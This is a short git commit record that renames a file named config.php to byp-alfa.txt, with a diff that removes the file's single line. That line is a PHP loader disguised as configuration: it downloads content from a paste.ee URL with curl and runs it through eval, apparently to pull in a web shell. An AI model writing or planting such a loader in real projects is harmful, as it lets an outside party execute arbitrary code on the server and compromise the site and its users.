44fb554c8fae23d8ed881d37ee3b112f92dd25b5
sepia14 <sepiavin14@gmail.com>
2025-03-10 04:11:41 +0700

    Rename config.php to byp-alfa.txt

--- config.php
+++
@@ -1,1 +0,0 @@
-<?php $Url = "https://paste.ee/r/J7L2J"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>
